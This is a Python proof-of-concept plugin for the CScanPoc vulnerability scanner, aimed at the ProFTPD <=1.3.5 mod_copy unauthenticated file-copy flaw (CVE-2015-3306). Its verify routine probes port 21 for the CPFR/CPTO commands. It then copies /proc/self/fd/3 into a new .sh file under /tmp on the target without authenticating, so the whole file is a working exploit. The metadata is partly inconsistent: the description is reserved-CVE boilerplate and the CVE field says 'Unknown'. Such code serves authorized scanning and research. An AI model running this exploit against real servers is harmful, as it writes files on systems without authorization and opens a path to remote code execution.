# coding: utf-8
import random
import telnetlib
import socket
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ProFTPD_0101'  # 平台漏洞编号，留空
    name = 'ProFTPD <=1.3.5 mod_copy 未授权文件复制'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-04-20'  # 漏洞公布时间
    desc = '''
        ProFTPD <=1.3.5 mod_copy 未授权文件复制漏洞(CVE-2015-3306)
        This candidate has been reserved by an organization or individual that will use it when announcing
        a new security problem. When the candidate has been publicized, the details for this candidate will be
        provided.
    '''  # 漏洞描述
    ref = 'http://bugs.proftpd.org/show_bug.cgi?id=4169'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ProFTPD'  # 漏洞应用名称
    product_version = '<=1.3.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '38d3f202-949b-47b0-9819-0614c256f806'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            tgtHost = urllib.parse.urlparse(self.target).hostname
            ip = socket.gethostbyname(tgtHost)

            tn = telnetlib.Telnet(ip, port=21, timeout=15)
            tn.write('site help\\r\\n')
            tn.write('quit\\n')
            status = tn.read_all()
            if 'CPTO' in status and 'CPFR' in status:
                tn = telnetlib.Telnet(ip, port=21, timeout=15)
                filename_tmp = '/tmp/evi1m0_%s.sh' % random.randint(1, 1000)
                tn.write('site cpto evi1m0@beebeeto\\n')
                tn.write('site cpfr /proc/self/fd/3\\n')
                tn.write('site cpto %s\\n' % filename_tmp)
                tn.write('quit\\n')
                result = tn.read_all()
                if 'Copy successful' in result:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;目标ip={ip},filename={filename}'.format(
                        target=self.target, name=self.vuln.name, ip=ip, filename=filename_tmp))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
